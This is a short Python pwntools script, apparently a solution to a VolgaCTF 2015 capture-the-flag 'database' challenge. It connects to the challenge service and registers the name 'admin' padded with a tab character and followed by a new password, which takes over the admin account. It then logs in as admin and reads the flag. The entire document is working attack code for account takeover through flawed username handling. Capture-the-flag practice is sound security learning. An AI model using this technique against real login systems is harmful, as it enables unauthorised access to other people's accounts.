from pwn import *
H,P='database.2015.volgactf.ru',7777
H,P='localhost',7777
r = remote(H,P)
print r.recvuntil('>> ')
r.sendline('register admin\t newpassword')
print r.recvuntil('>> ')
r.sendline('login admin newpassword')
print r.recvuntil('>> ')
r.sendline('get_flag')
flag = r.recvuntil('\n')[:-1] # minus newline
print flag
